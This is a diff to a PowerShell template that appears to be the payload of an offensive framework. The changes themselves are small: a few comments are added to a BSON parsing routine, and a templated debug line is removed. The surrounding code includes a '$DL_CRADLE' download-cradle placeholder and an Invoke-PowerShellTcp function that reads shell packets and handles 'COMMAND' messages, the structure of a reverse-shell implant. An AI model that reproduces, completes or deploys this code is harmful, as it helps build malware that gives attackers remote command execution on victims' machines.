@@ -6,7 +6,7 @@ $DL_CRADLE = @'
 {{dl_cradle}}
 '@
 
-$elements = @{
+$elements = @{ # bson elements
     [Double] = 1
     [System.String] = 2
     [System.Collections.Hashtable] = 3
@@ -78,6 +78,7 @@ function ConvertFrom-Bson {
         }
     }
     if ($type -eq 3 -or $type -eq 4) {
+        # TODO handle arrays separately
         while ($True) {
             $key = ""
             $type = $array[$i]
@@ -96,6 +97,7 @@ function ConvertFrom-Bson {
             if ($i -ge $array.length - 2  ) {break}
         }
     } elseif ($type -eq 2) {
+        # remove the null byte at the end
         $result = $enc.GetString($array[0 .. ($array.length-2)])
     } else {
         throw "Type not supported yet", $type, $array
@@ -225,7 +227,6 @@ function Invoke-PowerShellTcp
         $data = ""
         while ( $packet = (Read-ShellPacket  $stream)[2] ) {
             $output = ""
-            {{'Write-Debug "Processing $($packet|out-string)"'|debug}}
             if ($packet.msg_type -eq "COMMAND") {
                 $data = $packet.data
 
